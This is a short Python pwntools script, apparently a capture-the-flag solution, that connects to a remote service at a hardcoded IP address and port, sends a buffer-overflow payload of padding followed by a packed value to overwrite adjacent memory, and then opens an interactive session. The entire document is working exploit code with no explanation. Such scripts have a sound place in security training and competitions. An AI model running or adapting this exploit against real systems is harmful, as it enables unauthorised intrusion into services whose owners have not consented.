from pwn import *

elf = ELF("./checkpoint")

#p = elf.process()
p = remote("103.107.183.244", 9702)
raw_input("DEBUG")

payload = b"A"*24
payload += b"B"*4
payload += p64(0x64)

p.sendline(payload)

p.interactive()
